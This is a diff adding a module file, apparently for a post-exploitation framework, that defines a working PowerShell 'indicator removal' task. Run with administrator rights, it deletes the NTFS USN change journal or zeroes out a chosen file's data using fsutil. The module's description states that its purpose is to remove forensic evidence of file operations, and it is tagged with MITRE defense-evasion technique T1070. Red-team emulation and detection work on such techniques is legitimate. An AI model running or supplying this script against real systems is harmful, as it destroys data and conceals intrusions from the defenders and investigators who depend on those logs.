@@ -1,0 +1,95 @@
+name: FSUtil-IndicatorRemoval
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Uses fsutil.exe to remove indicators from a Windows host. Supports
+  deleting the USN (Update Sequence Number) change journal which
+  provides a persistent log of all file changes on an NTFS volume,
+  and zeroing out file data using fsutil file setZeroData. Deleting
+  the USN journal removes forensic evidence of file operations.
+software: ''
+tactics: [TA0005]
+techniques: [T1070]
+background: true
+output_extension:
+needs_admin: true
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Method
+    description: >-
+      Method to use (usn_delete to delete the USN journal, zero_data to zero file
+      data).
+    required: true
+    value: 'usn_delete'
+    suggested_values:
+      - usn_delete
+      - zero_data
+  - name: Drive
+    description: Drive letter for USN journal deletion.
+    required: false
+    value: 'C:'
+    depends_on:
+      - name: Method
+        values: ['usn_delete']
+  - name: FilePath
+    description: File path for zero_data method.
+    required: false
+    value: ''
+    depends_on:
+      - name: Method
+        values: ['zero_data']
+  - name: DataLength
+    description: Number of bytes to zero for zero_data method.
+    required: false
+    value: '10'
+    depends_on:
+      - name: Method
+        values: ['zero_data']
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-FSUtilIndicatorRemoval {
+      param(
+          [string]$Method = "usn_delete",
+          [string]$Drive = "C:",
+          [string]$FilePath,
+          [string]$DataLength = "10"
+      )
+
+      switch ($Method.ToLower()) {
+          "usn_delete" {
+              Write-Output "[*] Deleting USN change journal on $Drive"
+              $result = fsutil usn deletejournal /D $Drive 2>&1
+              Write-Output "[+] Executed: fsutil usn deletejournal /D $Drive"
+              Write-Output $result
+          }
+          "zero_data" {
+              if (-not $FilePath) {
+                  Write-Output "[-] FilePath is required for zero_data method."
+                  return
+              }
+              if (-not (Test-Path $FilePath)) {
+                  Write-Output "[-] File not found: $FilePath"
+                  return
+              }
+              $result = fsutil file setZeroData offset=0 length=$DataLength "$FilePath" 2>&1
+              Write-Output "[+] Executed: fsutil file setZeroData offset=0 length=$DataLength $FilePath"
+              Write-Output $result
+          }
+          default {
+              Write-Output "[-] Invalid method: $Method. Use usn_delete or zero_data."
+          }
+      }
+  }
+script_end: Invoke-FSUtilIndicatorRemoval {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
